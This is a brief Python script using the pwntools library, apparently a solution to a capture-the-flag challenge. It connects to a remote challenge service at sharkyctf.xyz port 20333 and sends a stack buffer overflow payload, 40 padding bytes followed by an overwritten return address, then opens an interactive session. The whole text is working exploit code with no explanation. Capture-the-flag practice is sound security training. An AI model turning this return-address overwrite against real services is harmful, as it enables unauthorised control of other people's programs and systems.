from pwn import *

payload = "A"*40+"\xa7\x06\x40\x00\x00\x00\x00\x00"
p = remote('sharkyctf.xyz', 20333)
p.sendline(payload)
p.interactive()
